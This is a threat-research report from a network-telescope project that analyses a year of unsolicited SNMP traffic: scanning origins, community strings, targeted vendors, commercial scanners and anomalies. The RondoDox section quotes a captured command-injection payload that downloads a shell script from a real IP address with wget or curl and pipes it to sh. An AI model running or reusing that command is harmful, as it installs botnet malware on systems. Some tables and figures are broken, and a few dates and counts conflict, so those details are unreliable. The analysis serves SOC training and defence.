# Behavioral Analysis of SNMP traffic

[PDF version - Learning from large-scale IPv4 blackhole: Behavioral analysis of SNMP traffic](/assets/behavioral-analysis-of-snmp-traffic.pdf)

## Executive summary

The missions of the european Project **NGSOTI** (Next Generation
Security Operator Training Infrastructure), is to empower SOC operators
and organisations across Europe with the knowledge, tools, and
infrastructure needed to defend effectively against ever-evolving cyber
threats. ([restena.lu](https://restena.lu/en/project/ngsoti)[^1]).
Within this scope the key objective of this report is to enhance SOC
operator capabilities.

SOCs carry the crucial mission of monitoring cybersecurity events and
escalating any incidents or detections of malicious activity. While the
task may seem straightforward, it is in fact increasingly complex.
Attackers continuously evolve their techniques, thereby forcing SOC
analysts to keep adapting.

These analysts are confronted with a dual challenge:

- On one hand, they must be versatile generalists, capable of responding
  across a wide spectrum of domains.
- On the other hand, the volume of alerts and information they must
  process frequently leads to cognitive fatigue.

This fatigue inevitably results in reduced alertness and motivation,
which can lead to miss-detections of critical incidents.

Our network telescope analysis is aligned with the core ambition of
NGSOTI: to develop an open-source training infrastructure powered by
real-world data that equips future SOC operators with advanced
capabilities in network-related alert handling, incident response, log
analysis, security operations management, threat intelligence, and
communication. ([restena.lu](https://restena.lu/en/project/ngsoti)[^2])

In this context, we target two complementary goals:

- Primarly, it will provide key insights and enriched data that enable
  SOC teams to understand threats to be able to detect attacks with
  finer granularity.

- Secondly , our goal is to reduce operator fatigue by optimising the
  knowledge of background noise . I will help improving alerts
  prioritisation improving vigilance and training of SOC analysts.

By pursuing these complementary objectives, we aim to enhance both SOC
performance and training quality within the NGSOTI framework. This
report examines the SNMP protocol interactions in depth and provides
operators actionable insights derived from its analysis.

## Acknowledgements

We would like to express our gratitude to the RESTENA Foundation for
providing the network infrastructure that made the creation of this
dataset possible. We also thank the European Union for supporting the
improvement of SOC operator training across Europe. Finally, we
acknowledge the contributions and assistance of our project partners,
whose support was essential to this work.

## What Is a Network Telescope?

A **[network
telescope](https://circl.lu/assets/files/circl-blackhole-honeynetworkshop2014.pdf)[^3]**,
also called a *black-hole* or *network sinkhole*, is a passive
monitoring system that observes traffic sent to large blocks of **unused
IP address space**. Because these IP ranges are never assigned to active
hosts and do not generate legitimate responses, **any traffic received
is by definition unsolicited**.

This makes network telescopes powerful tools for studying global
Internet behavior. They capture background noise, scanning activity,
accidental leakage, malicious probes, and misconfigurations that would
otherwise remain invisible.

In the context of this report, the network telescope serves as the
foundation of our dataset, enabling the systematic analysis of global
SNMP traffic, vendor targeting patterns, commercial scanner behavior,
and misconfigurations observed across the Internet.

# Analysis scope

This report presents a CIRCL analysis of traffic captured on its network
telescope, with a focus on SNMP-related network activity. The findings
are valuable for **SOC operator training**, as they help analysts
understand how SNMP works, how it can be abused, and how background
noise on this protocol can affect visibility and detection.

The Simple Network Management Protocol (SNMP) is a standardized protocol
used to monitor, manage, and configure networked devices such as
routers, switches, servers, and IoT systems. It enables administrators
to collect information about device performance, network traffic, and
operational status, as well as remotely control certain device
parameters.

SNMP operates in a client-server model: managed devices run an SNMP
agent that exposes management data, while a network management system
(NMS) queries these agents or receives notifications (traps). Data is
structured in the form of Object Identifiers (OIDs), which represent
specific metrics such as CPU load, interface status, or memory usage.
This Traffic is using UDP (Unified Datagram Protocol). Therefore thes
traffic is interesting to analyse since it give relevant data even if no
host are listening and responding to.

SNMP supports three versions:

- `v1` and `v2c`: Basic functionality with community strings for
  authentication, but limited security.

- `v3`: Adds cryptographic security with authentication and encryption.

## Dataset and Timeframe

The dataset is an extract of SNMP traffic captured by CIRCL’s network
telescope between 1 November 2024 and 31 October 2025. Each record in
the dataset represents a single SNMP packet received by the telescope.
It includes the packet reception timestamp, source and destination IP
addresses, associated ports, SNMP version, SNMP query type, requested
OIDs, community string (if applicable), and a reference to the
corresponding PCAP file.

The network monitored by the telescope is a `/18` containing 16,382 IPv4
addresses, located only one bit away from a private [RFC1918
range](https://datatracker.ietf.org/doc/html/rfc1918)[^4].

This network setup enables the capture of not only standard scanning and
exploit activity but also misconfigurations or “typo” traffic intended
for nearby private network spaces. The dataset provides insight into
automated scanning campaigns as well as opportunistic reconnaissance
activity observed over the past 12 months.

The collection mechanisms operate on an unfiltered, Internet-routed
network segment and capture traffic in 5-minute PCAP files, preserving
the full packet payload.

## Data lake setup

The SNMP traffic was extracted from the raw PCAP files using
[Suricata](https://suricata.io/) 7.0.3[^5], an open-source network
threat-detection engine capable of parsing protocols in real time.
Suricata generated structured metadata, including SNMP version,
community strings, requested OIDs, source and destination IPs and ports,
and timestamps.

The following Suricata configuration was used to detect SNMP traffic on
both standard and non-standard UDP or TCP ports. In this network
telescope environment, SNMP over TCP is more likely to appear.

``` yaml
%YAML 1.1
---
outputs:
  - eve-log:
      enabled: yes
      filetype: regular
      filename: ./eve.json
      types:
        - snmp:
            enabled: yes
```

These metadata extracted by Suricata were ingested into
[ClickHouse](https://clickhouse.com/) 25.9.3.1[^6], a high-performance
columnar database optimized for analytical workloads. ClickHouse’s fast
aggregation and query capabilities make it well suited for statistical
analysis of SNMP traffic, including tracking scanning patterns,
frequently requested OIDs, and temporal trends in probing activity.

The final data lake contains the following structure;

## General Statistical Analysis

### SNMP Activity

#### Methodology

We leveraged the volumetric information available in the data lake to
quantify the activity associated with each source IP. To enrich this
analysis, we correlated all source IP addresses with their corresponding
BGP Autonomous Systems using network WHOIS data. For both ASN and
country-level attribution, we used the historical IP-to-ASN mapping
service provided by the CIRCL D4 project, specifically the
[IPASN-History
dataset](https://github.com/D4-project/IPASN-History)[^7].

#### Results

The year-long analysis reveal that the IPv4 `/18` sinkhole was contacted
via SNMP by 153.045 distinct IPv4 sources, generating a total of 634.02
million SNMP queries. The diagram below illustrates the daily volume
over full period analysed.

alt="SNMP Daily Activity over the Collected Period" />
<figcaption aria-hidden="true">SNMP Daily Activity over the Collected
Period</figcaption>
</figure>

The frequency analysis highlights clear spikes of more than 3.5 millions
of SNMP queries per day on the following dates:

– Late November 2024 and early October 2024  
– 14 January 2025  
– 2–3 June 2025  
– 29 October 2025

The overall volume of SNMP activity decreased by a factor of two,
although the underlying cause of this change remains unknown.

### Country Distribution

To visualise the origin of the SNMP traffic, we used two criteria:
packet volume and the number of distinct source IP addresses per
country.

Many interesting insights emerge from this output:

- Indonesia is the leading country in terms of packets emitted, just
  ahead of China, despite having 50 times fewer source IPs.
- Palestine emitted 98 million packets from only two IP addresses. This
  behavior is analyzed in the chapter *Anomalies Investigation /
  Palestinian Traffic*.

Splitting the queries across BGP Autonomous Systems makes it possible to
distinguish traffic originating from countries other than China,
Indonesia, and Palestine. This analysis reveals additional countries
that generate substantial volumes of SNMP traffic, including Germany,
Japan, Russia, Chile, and several others.

It is even more informative to examine SNMP traffic by looking at the
number of distinct source IP addresses used within each BGP Autonomous
System (AS). This perspective highlights which networks contribute the
largest IP space to SNMP scanning activity. Beyond major operators such
as ChinaNet Backbone N31 and hosting providers like DigitalOcean, a
significant share of the traffic comes from mobile networks and domestic
Internet service providers.

The large number of distinct sources observed in mobile networks may be
explained by the presence of ORB nodes (Open Relay Boxes) commonly used
for large-scale distributed scanning, but it could also result from
misconfigurations or stray traffic inadvertently targeting the network
telescope. Notable examples include HI3G, COMUNICACIÓN CELULAR S.A.,
Comcel S.A., and others.

### SNMP Version Distribution

#### Methodology

The methodology used to produce the SNMP version distribution is
straightforward: each SNMP packet observed in the sinkhole
traffic—whether a request, response, or trap—is parsed to extract its
SNMP version field. All captured frames containing SNMP data are
processed individually, and the version identifiers are aggregated to
compute their overall distribution. This approach ensures that the
resulting graph accurately reflects the protocol versions present in the
observed background noise.

#### Results

<figure>
<img src="/assets/images/picts/65f940e5b004ed2845676f0aff1cfe798d1dcc58.png"
alt="SNMP Queries version repartition" />
<figcaption aria-hidden="true">SNMP Queries version
repartition</figcaption>
</figure>

The final dataset contains 634.02 million SNMP packets. The analysis of
SNMP versions shows that only about 2% of queries use SNMPv3. This low
adoption is expected in this context, as SNMPv3 secures the
communication channel through authentication and encryption, making it
less attractive for uncontrolled or opportunistic scanning activities.
In contrast, SNMPv1 and SNMPv2c are simple, weak, and widely deployed,
and their lack of security controls allows unauthorized actors to
retrieve information easily. As a result, these legacy versions
constitute the overwhelming majority of the background scanning traffic
observed.

### SNMP Community

#### Methodology

The methodology for this representation consists of extracting SNMP
community strings from all SNMPv1 and SNMPv2c packets in the dataset.
These versions expose the community field in clear text, making it
directly observable and suitable for statistical analysis. SNMPv3
packets were intentionally excluded, as their authentication and
encryption mechanisms prevent community or credential data from being
visible. The analysis is therefore limited to v1 and v2c, where the
community string is present and readable in every captured frame. Empty
SNMP community strings are labeled as “Empty” to ensure they appear
clearly in the word cloud.

#### SNMP Community Distribution

<figure>
<img src="/assets/images/picts/0028c1231324ade1b734a285b234445cb7c7ad0d.png"
alt="SNMP v1 &amp; v2c community string distribution" />
<figcaption aria-hidden="true">SNMP v1 &amp; v2c community string
distribution</figcaption>
</figure>

A large variety of community strings is expected when examining traffic
generated by discovery-oriented scanning activities.

- **PUBLIC** is the historical default SNMP read-only community.  
- **[CANON_ADMIN](https://oip.manual.canon/USRMA-0219-zz-SS-enUS/contents/10040030.html)[^8]**
  is the documented default community for Canon printers.  
- **PRIVATE** is also a commonly documented default for read-write
  access. For example, this configuration is referenced for
  **[Cisco](https://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/7282-12.html)[^9]**
  devices.

More interestingly, the dataset highlights the presence of other
“internal” community strings, as well as numerous variations of
“public.” These observations illustrate how frequently weak or guessable
strings appear in unsolicited SNMP traffic.

The following graph depicts the relationship between hardware vendors
(identified by requested OIDs) and the SNMPv1/v2c community strings
used. It clearly shows that, beyond “public,” certain devices are
targeted with very specific OIDs. This reveals attempts to abuse default
SNMP communities; however, most of the non-public strings observed in
this dataset are not documented.

</figure>

### Scanned Vendors

#### Methodology

To analyze the SNMP sinkhole dataset, we focus on the Object Identifiers
(OIDs) queried by source IPs. Since each SNMP packet may contain
multiple OIDs, we flatten the data so that each OID can be examined
individually. Many OIDs are common across platforms. It is important to
note that most of the OIDs requested in the network telescope are
vendor-agnostic, as they belong to the standard branches of the OID
tree. For example, retrieving a device’s hostname can be done using the
OID
[1.3.6.1.2.1.1.3.0](https://support.huawei.com/enterprise/en/doc/EDOC1100126900/861a99d5/obtaining-device-information-through-snmp-get)[^10].

<figure>

alt="SNMP OID Organisation" />
<figcaption aria-hidden="true">SNMP OID Organisation</figcaption>
</figure>

However, some OIDs are vendor-specific. To identify these, we extracted
the vendor prefixes following the pattern `1.3.6.1.4.1.x`, where `x`
corresponds to a specific vendor. By counting how often each vendor
prefix appears and ranking them, we can determine which vendors’ devices
are most frequently targeted or scanned. This methodology helps uncover
trends in attacker behavior, highlight reconnaissance activity, and
detect potential interest in specific device types observed in the wild.

#### Scanned Vendors Distribution

alt="Yearly Vendor scan Coverage" />
<figcaption aria-hidden="true">Yearly Vendor scan Coverage</figcaption>
</figure>

It is noteworthy that several device families do not exhibit continuous
scanning activity throughout the year. For example, Cisco-related OIDs
appear only between March and May 2025, while Lite-On Technology
Corp. devices are observed from January through July. This irregularity
suggests that some scanning campaigns may be influenced by targeted
interests or time-limited operations rather than broad, systematic
reconnaissance.

It should also be noted that, at this stage, this approach does not
distinguish intentional scanning from misconfiguration.

A valuable follow-up investigation would be to examine whether publicly
disclosed SNMP exploitation techniques, proof-of-concept releases, or
newly identified SNMP-related vulnerabilities surfaced during these same
periods. Correlating vendor-specific scanning activity with
vulnerability disclosure timelines could help determine whether the
observed traffic is linked to opportunistic exploitation attempts or
simply reflects general background scanning.

## Anomalies Investigated

### Palestinian Traffic

According to the volumetric analysis, the Palestinian Autonomous System
12975 emitted 41.8 million packets.

       ┌─ip────────────┬─as_number─┬─as_name────────────────────────────┐
    1. │ 213.6.137.78  │     12975 │ PALTEL-AS PALTEL Autonomous System │

       └───────────────┴───────────┴────────────────────────────────────┘

It appears that the traffic was generated exclusively by the host
**213.6.137.78**, starting on 31 December 2025 and continuing until 19
May. This IP address has no associated PTR DNS records and does not
appear in our passive DNS database.

For each destination, two different scans are performed. Each scan is
repeated three times, with a retry interval of three seconds.

The first type of scan issues an SNMP GET request querying the following
generic SNMP OIDs:

- `1.3.6.1.2.1.2.2.1` — ifEntry
- `1.3.6.1.2.1.4.20.1` — ipAddrTable
- `1.3.6.1.2.1.4.22.1` — ipNetToMediaTable

It then queries the undocumented vendor-specific OID:

- `1.3.6.1.2.1.9999.1.1.6.4.1`

This scanning pattern may be related to MikroTik OS devices, as
documented in public walk outputs[^11], and appears to allow the
determination of internal IP addresses.

``` bash
snmpwalk [redacted] -v1 -c public 1.3.6.1.2.1.9999.1.1.6.4.1 | head
Error: OID not increasing: iso.3.6.1.2.1.9999.1.1.6.4.1.4.192.168.33.99
 >= iso.3.6.1.2.1.9999.1.1.6.4.1.4.172.31.33.144

iso.3.6.1.2.1.9999.1.1.6.4.1.4.192.168.33.99 = INTEGER: 2
iso.3.6.1.2.1.9999.1.1.6.4.1.4.172.31.33.144 = INTEGER: 2
```

The second scan is also a SNMP get request on;

- 1.3.6.1.2.1.25.3.3.1.2 hrProcessorEntry
- 1.3.6.1.2.1.25.2.3.1.2 hrStorageEntry

For all the request, no payload are present.

This recurrent schema is observable for all destination IP’s.

### RondoDox Campaign Exploitation

We detected Linux command injection attempts targeting port 162. The
payload executed is:

    echo;(wget -O- http://169.255.72.169/rondo.sh||busybox wget -O- http://169.255.72.169/rondo.sh||curl http://169.255.72.169/rondo.sh) | sh -s random.162;echo 

However, this command is broadcast abruptly over UDP without using the
SNMP protocol at all. In addition, the same injection is sent raw to
many IP addresses and UDP ports.

<figure>

alt="Command Injection of RandoDox" />
<figcaption aria-hidden="true">Command Injection of
RandoDox</figcaption>
</figure>

This command attempts to download the file `rondo.sh` using several
methods (`wget`, BusyBox’s built-in `wget`, and `curl`). That file
retrieves another
[script](https://www.virustotal.com/gui/file/aa518f13570fa2eec0fc3a4dd5ff0a7438fff5491d6e0650c94520651b02f456/content)[^12],
which is still available on the VirusTotal platform. The second script
then downloads the final payload, selecting the appropriate binary for
the target system’s architecture.

Based on the naming used in the payload, this activity can be linked to
a Trend Micro report. According to their analysis, the injection appears
to be part of a botnet deployment campaign known as
[RondoDox](https://www.trendmicro.com/en_us/research/25/j/rondodox.html)[^13].

The RondoDox campaign represents a large-scale botnet operation that
systematically exploits more than fifty disclosed vulnerabilities across
a wide range of internet-exposed devices from over thirty vendors. By
using a multi-exploit, high-volume probing strategy, the operators
target routers, DVRs, NVRs, and various CCTV systems—including
vulnerabilities originally disclosed during Pwn2Own competitions.

In our case, however, the absence of identifiable headers or protocol
metadata prevented any reliable association with a known CVE. This
context underscores the persistent risks linked to delayed IoT patching.

### CVE-2021-44228 (Log4J Vulnerability) Scanning

On May 19th, a source in Great Britain (194.80.247.247), belonging to AS
*JANET Jisc Services Limited*, attempted Log4J execution probes. The
injections targeted not only SNMP ports but a wide range of other ports
as well. Although the activity is not operationally significant, it
illustrates that some actors continue to test for legacy
vulnerabilities.

In this case, the scanner appears to be
**[Nessus](https://www.tenable.com/products/nessus)[^14]**, and it
probed numerous TCP and UDP ports. With regard to SNMP specifically, the
following Log4J injection was observed using both SNMPv1 and SNMPv2c.

### Cisco Device Backup Exploitation

Cisco devices implement a mechanism that allows configuration backups to
be triggered through SNMP using the **CISCO-CONFIG-COPY-MIB**
(`1.3.6.1.4.1.9.9.96`). This capability is intended for administrative
automation of configuration management.

The MIB enables configuration backup operations through a dedicated
management table, **ccCopyTable**, which defines all parameters required
to copy configurations between internal device storage and an external
repository. Rather than exposing the configuration text directly via
SNMP, the mechanism instructs the device to perform a controlled copy
operation.

To initiate a backup, an entry must be created in the `ccCopyTable`. The
request must specify the required parameters, including:

- Source of the configuration (e.g., running configuration),
- destination of the copy (e.g., a network file),
- Transfer protocol to be used (commonly TFTP)
- Filename used for backup
- Address of the external server that will receive the file.

Such behaviour was observed on the following sources:

| src_ip        | community    |
|---------------|--------------|
| 200.54.90.138 | s0l4rw1ndsle |
| 200.54.90.138 | ehealthle    |
| 138.0.99.230  | 00deadbemf   |

### SNMP Misconfigurations

Due to the proximity between our network telescope’s address space and
an RFC1918 range, some SNMP observations include artefacts resulting
from device monitoring misconfigurations. The example below shows a
Cisco device transmitting unsolicited SNMP traps.

<figure>

alt="Cisco Switch Misconfig" />
<figcaption aria-hidden="true">Cisco Switch Misconfig</figcaption>
</figure>

Further inspection of other protocols reveals that the same device also
emits SYSLOG messages, confirming the misconfiguration. This Mexican
host, belonging to AS 8151 (*UNINET*), communicated with the network
telescope between 21 February and 15 May 2025, inadvertently leaking
internal information including IP addresses, operational status,
software version, and the SNMP community string.

Numerous similar misconfigurations are present in the network telescope
data.

## Scanning Network Intelligence Vendor Traffic

### Methodology

Because the network telescope contains no resolvable IP addresses or
active services, distinguishing commercial scanners from institutional
ones is relatively straightforward. This prompted an investigation into
whether scanners misusing SNMP could be reliably identified. For many
sources, a simple reverse DNS (PTR) lookup was sufficient.

These lookups allowed us to refine and extend the relevant [MISP warning
list](https://github.com/MISP/misp-warninglists)[^15], thereby improving
the situational awareness and operational capabilities of SOC teams.
Over the course of the year, we identified the following scanners
issuing SNMP queries.

Commercials:

- [Censys](https://search.censys.io/) 96 Hosts
- [Shodan](https://www.shodan.io/) 50 Hosts
- [Onyphe](https://www.onyphe.io/) 32 Hosts
- [Internet Census](https://www.internet-census.org/home.html) 440 Hosts
- [Binary Edge](https://www.binaryedge.io/) 38 Hosts
- [ShadowForce](https://shadowforce.io/) 465 Hosts
- [Driftnet.io](https://internet-measurement.com/) 504 Hosts
- [Modat.io](https://www.modat.io) 12 Hosts

Academics/Research:

- [Shadowserver](https://www.shadowserver.org/) 465 Hosts

Questionnables scanners:

- [Stretchoid](https://stretchoid.com) 343 Hosts
- [NetSecScan](http://netsecscan.net/) 16 Hosts
- Internettl 61 Hosts

For each group of detected scanners, we analyzed the OIDs they queried
as well as their overall network footprint. Scanners that did not
communicate using SNMP were not taken into consideration.

### Results

We analyzed exclusively the scanners issuing SNMP queries. With the
exception of Internet Census, the observed scanners appear to perform
only device fingerprinting. It should be noted, however, that the
telescope network corresponds to a passive IP range. None of the queried
OIDs returned any results, suggesting that these scanners might request
additional OIDs when interacting with responsive devices.

#### Censys

<figure>
<img src="/assets/images/picts/37cc6d816a9dc86b39b13d295d0f877d5fe7f8bb.png"
alt="Censys sample of traffic pattern" />
<figcaption aria-hidden="true">Censys sample of traffic
pattern</figcaption>
</figure>

Censys is an Internet-wide scanning and asset-visibility platform based
in the United States. It continuously maps exposed services and helps
organizations identify risks across their public-facing infrastructure.

We identified 81 distinct IP addresses in our dataset whose DNS PTR
records resolve to one of the following six Censys scanner hostnames:

- `scanner-001.hk2.censys-scanner.com`
- `scanner-101.ch1.censys-scanner.com`
- `scanner-011.ch1.censys-scanner.com`
- `scanner-007.ch1.censys-scanner.com`
- `scanner-11.ch1.censys-scanner.com`
- `scanner-14.ch1.censys-scanner.com`

In addition to these records, 16 other IP addresses resolve to the PTR
`unused-space.coop.net`. We attribute these IPs to Censys as well, since
all of them fall within AS networks operated by Censys (AS398324).

All Censys scanners observed originated from ranges in the following BGP
Autonomous Systems:

| AS       | Range            |
|----------|------------------|
| AS398324 | 167.94.138.0/24  |
| AS398324 | 66.132.153.0/24  |
| AS398424 | 162.142.125.0/24 |
| AS398722 | 199.45.154.0/24  |
| AS398324 | 206.168.34.0/24  |

Based on geolocation inferred from routing paths, the servers appear to
be located in both Chicago (CH) and Hong Kong (HK).

Traceroute for example IP **66.132.153.154**:

- 1.  e0-1.core2.lux1.he.net (216.66.93.57)  
- 2.  100ge0-34.core2.bru1.he.net (184.104.194.110)  
- 3.  100ge0-78.core2.par2.he.net (184.104.193.137)  
- 4.  port-channel8.core2.nyc4.he.net (72.52.92.166)  
- 5.  port-channel18.core3.chi1.he.net (184.104.193.173)  
- 6.  censys-inc.e0-22.switch7.chi1.he.net (184.105.45.218)  
- 7.  scanner-101.ch1.censys-scanner.com (66.132.153.154)

Additionally, during the observation period, all requests from these IPs
used only SNMPv3 queries, which prevented us from determining the
queried OIDs or the community strings.

It should be noted that, in addition to SNMP, a single scanner probes 74
other TCP ports and 12 other UDP ports.

#### Shodan

<figure>
<img src="/assets/images/picts/d9f7b334732d111fb52c1174a02fe37c0615ff8f.png"
alt="Shodan IP’s sample of traffic pattern" />
<figcaption aria-hidden="true">Shodan IP’s sample of traffic
pattern</figcaption>
</figure>

Shodan is an Internet-wide search engine. Like Censys, it identifies and
indexes publicly reachable devices and services by scanning their
exposed network banners. It is widely used to analyze global attack
surfaces, study service deployments, and assess the security posture of
connected systems.

From our network telescope data collected over the past year, we
observed that Shodan used 46 distinct PTR records across a total of 50
different IP addresses. All PTR records fall into two categories:

**30 “Census”-related PTR records**, for example:

- `house.census.shodan.io`
- `battery.census.shodan.io`
- `flower.census.shodan.io`
- `cloud.census.shodan.io`

**16 “Scanf”-related PTR records**, for example:

- `pancake.scanf.shodan.io`
- `biscuit.scanf.shodan.io`
- `bacon.scanf.shodan.io`
- `hashbrown.scanf.shodan.io`

Shodan appears to operate a globally distributed fleet of scanners. Its
infrastructure spans multiple hosting providers, including DigitalOcean
(AS14061), BlackHost LTD (AS12989), CariNet, Inc. (AS10439), and IP
Volume Inc. (AS202425).

| AS       | Range            |
|----------|------------------|
| AS14061  | 143.198.68.0/24  |
| AS14061  | 165.227.55.0/24  |
| AS14061  | 165.227.62.0/24  |
| AS12989  | 185.142.236.0/24 |
| AS12989  | 185.165.191.0/24 |
| AS12989  | 195.144.21.0/24  |
| AS12989  | 86.54.31.0/24    |
| AS12989  | 2.59.22.0/24     |
| AS14061  | 64.227.90.0/24   |
| AS10439  | 66.240.219.0/24  |
| AS10439  | 71.6.135.0/24    |
| AS10439  | 71.6.146.0/24    |
| AS10439  | 71.6.158.0/24    |
| AS10439  | 71.6.199.0/24    |
| AS202425 | 80.82.77.0/24    |
| AS202425 | 89.248.167.0/24  |
| AS202425 | 89.248.172.0/24  |
| AS202425 | 93.174.95.0/24   |
| AS202425 | 94.102.49.0/24   |

##### Scanf Hosts

Scanf hosts performed the following queries:

| community     | oids              | version |
|:--------------|:------------------|--------:|
| public        | 1.3.6.1.2.1.1.5.0 |       1 |
| *not visible* | —                 |       3 |

The SNMPv1 OID `1.3.6.1.2.1.1.5.0` corresponds to **sysName**, an
administratively assigned identifier generally used for the fully
qualified domain name of a device. If the name is unknown, the value is
empty.

Again, SNMPv3 queries prevent us from identifying the second queried OID
or its associated community string.

##### Census Hosts

Census hosts performed a broader set of OID requests:

| community     | oids                  | version |
|:--------------|:----------------------|--------:|
| public        | 1.3.6.1.2.1.1.1.0     |       1 |
| public        | 1.3.6.1.2.1.1.5.0     |       1 |
| public        | 1.3.6.1.2.1.1.8.1     |       2 |
| —             | 1.3.6.1.2.1.1.3.0     |       — |
| —             | 1.3.6.1.2.1.1.5.0     |       — |
| —             | 1.3.6.1.2.1.1.4.0     |       — |
| —             | 1.3.6.1.2.1.1.1.0     |       — |
| —             | 1.3.6.1.2.1.1.7.0     |       — |
| —             | 1.3.6.1.2.1.1.2.0     |       — |
| —             | 1.3.6.1.2.1.1.6.0     |       — |
| —             | 1.3.6.1.2.1.1.9.1.4.1 |       — |
| —             | 1.3.6.1.2.1.1.9.1.1.1 |       — |
| —             | 1.3.6.1.2.1.1.9.1.2.1 |       — |
| —             | 1.3.6.1.2.1.1.9.1.3.1 |       — |
| *not visible* | —                     |       3 |

In addition to the previous observations, we again find the `sysName`
OID (`1.3.6.1.2.1.1.5.0`), as well as an SNMPv2 query containing 12 OIDs
commonly used to retrieve generic device information:

- **1.3.6.1.2.1.1.8.1 / 2** – Part of *sysORTable*; operational status
  entries for system capabilities.  
- **1.3.6.1.2.1.1.3.0** – *sysUpTime*; time since the device last
  rebooted.  
- **1.3.6.1.2.1.1.5.0** – *sysName*; system hostname.  
- **1.3.6.1.2.1.1.4.0** – *sysContact*; administrative contact
  information.  
- **1.3.6.1.2.1.1.1.0** – *sysDescr*; full device description (model,
  OS, firmware version).  
- **1.3.6.1.2.1.1.7.0** – *sysServices*; bitmap indicating which network
  layers the device implements.  
- **1.3.6.1.2.1.1.2.0** – *sysObjectID*; vendor/device identifier.  
- **1.3.6.1.2.1.1.6.0** – *sysLocation*; physical location of the
  device.  
- **1.3.6.1.2.1.1.9.1.4.1** – *sysORUpTime*; time since this OR (Object
  Resource) entry was instantiated.  
- **1.3.6.1.2.1.1.9.1.1.1** – *sysORIndex*; index of an OR entry.  
- **1.3.6.1.2.1.1.9.1.2.1** – *sysORID*; OID identifying a supported MIB
  module.  
- **1.3.6.1.2.1.1.9.1.3.1** – *sysORDescr*; description of the
  associated MIB module.

#### Onyphe

<figure>

alt="Onyphe IP’s sample of traffic pattern" />
<figcaption aria-hidden="true">Onyphe IP’s sample of traffic
pattern</figcaption>
</figure>

Onyphe is a French cyber-intelligence search engine that collects and
correlates data from scans, open sources, and global observation points
to analyze the exposure of connected systems. It is used to assess
attack surfaces, identify potential compromises, and monitor threat
activity.

Onyphe scans the following MIB:

| Community | OID               | Version |
|-----------|-------------------|--------:|
| public    | 1.3.6.1.2.1.1.1.0 |       1 |

This OID corresponds to *sysDescr*, a textual description of the device
that typically includes the system’s hardware name, operating system,
and version information.

From our network telescope data collected over the past year, we
observed that Onyphe used 32 IP addresses, all following a consistent
PTR naming pattern under the **onyphe.net** domain.

These IP addresses are either located within Onyphe’s own ASN
(**AS213412 — ONYPHE SAS**) or hosted at OVH (**AS16276**, specifically
the range 91.134.185.0/24). Onyphe hosts appear to follow the naming
scheme:

**\[name\].probe.onyphe.net**

For example:  
- `barker.probe.onyphe.net`  
- `annemarie.probe.onyphe.net`  
- `douglas.probe.onyphe.net`  
- `josephine.probe.onyphe.net`  
- `ratcliffe.probe.onyphe.net`

#### Internet Census

</figure>

The Internet Census Group is a research initiative led by BitSight
Technologies, Inc., which regularly scans the public Internet to
identify exposed systems and assess global security posture.

Internet Census scans the following MIBs:

| community     | oids                             | version |
|:--------------|:---------------------------------|--------:|
| a             | 1.3.6.1.2.1.1.1.0                |       2 |

|               | 1.3.6.1.2.1.1.5.0                |         |
|               | 1.3.6.1.2.1.1.6.0                |         |
|               | 1.3.6.1.2.1.1.7.0                |       2 |
| public        | 1.3.6.1.2.1.1.1.0                |       1 |
| public        | 1.3.6.1.2.1.1.1.0                |       2 |

| *not visible* | —                                |       3 |

Interestingly, Internet Census also scans using the community string
**“a”**, which is associated with Cable Television Laboratories devices.
The corresponding OID is used by cable modems such as those from ARRIS
(formerly Motorola Broadband). This specific OID typically corresponds
to **docsIfDownChannelFrequency**, which reports the downstream
frequency in hertz.

More commonly, Internet Census scans for basic device information using
both SNMPv1 and SNMPv2:

- **1.3.6.1.2.1.1.1.0 – sysDescr**: full device description (model, OS,
  firmware).  
- **1.3.6.1.2.1.1.2.0 – sysObjectID**: vendor/device identifier OID.  
- **1.3.6.1.2.1.1.3.0 – sysUpTime**: time since last reboot.  
- **1.3.6.1.2.1.1.4.0 – sysContact**: administrative contact
  information.  
- **1.3.6.1.2.1.1.5.0 – sysName**: device hostname.  
- **1.3.6.1.2.1.1.6.0 – sysLocation**: physical location of the
  device.  
- **1.3.6.1.2.1.1.7.0 – sysServices**: network service layers supported
  by the device.

In addition to OID queries, we identified **440 distinct IP addresses**
in the dataset whose PTR records resolve to Internet Census–related
hostnames, each mapping to a unique reverse-DNS entry.

Examples of the PTR naming format include:

- `sh-chi-us-gp1-wk103b.internet-census.org`
- `sh-ams-nl-gp1-wk140d.internet-census.org`
- `sh-phx-us-gd10-wk102b.internet-census.org`
- `zl-lax-us-gp1-wk132d.internet-census.org`
- `zl-laxd-us-cpp-wk111.internet-census.org`
- `zl-laxd-us-gp1-wk133b.internet-census.org`
- `zl-amsc-nl-gp6-wk117d.internet-census.org`
- `zl-dala-us-gp1-wk119a.internet-census.org`

Unlike the PTR records of other commercial scanners, these PTR hostnames
resolve directly back to the originating IP address. All of these IPs
are located in two Autonomous Systems:

| AS     | Network          | AS Name     |

BinaryEdge is a Swiss-based cybersecurity company specializing in
Internet-wide scanning and threat intelligence. It was acquired by
Coalition, Inc. in 2020, and its technology has since been integrated
into Coalition’s cyber-risk platform.

BinaryEdge scans the following MIBs:

| Community     | OID               | Version |
|---------------|-------------------|--------:|
| public        | 1.3.6.1.2.1.1.5.0 |       1 |
| *not visible* | —                 |       3 |

The SNMPv1 OID corresponds to *sysName*, an administratively assigned
name for a managed node. By convention, this is the device’s fully
qualified domain name; if unknown, the value is an empty string.

PTR records provide useful insight into the geographic and
infrastructure distribution of BinaryEdge scanners. Examples include:

- `prod-beryllium-us-west-102.li.binaryedge.ninja`  
- `dev-meitnerium-us-west-14.li.binaryedge.ninja`

ShadowForce is part of the cyber–threat intelligence division of Baffin
Bay Technologies, a subsidiary of Mastercard. It operates a global
sensor network to collect and analyze malicious IP addresses and threat
signals, supporting enterprise threat-protection services.

ShadowForce scans only using SNMPv1, querying the *sysDescr* MIB, which
provides a textual description of the device. This value typically
includes the full name and version information of the system’s hardware
and software.

| community | oids              | version |
|:----------|:------------------|--------:|
| public    | 1.3.6.1.2.1.1.1.0 |       1 |

We found out 313 IP and related PTR. The format of the PTR seems to be
\[name\]-\[id\].scan.shadowforce.io. Only 3 sci-fy related name seems to
be used.

Some examples include:

- `decard-100.scan.shadowforce.io`
- `decard-101.scan.shadowforce.io`
- `decard-102.scan.shadowforce.io`
- `trinity-101.scan.shadowforce.io`

| *not visible* | —                 |       3 |

Driftnet issues queries only using SNMPv2 and SNMPv3. The SNMPv2 OID
corresponds to *sysName*, an administratively assigned name for the
managed node.

We determined that Driftnet bots use PTR records under the domains
**monitoring.internet-measurement.com** and
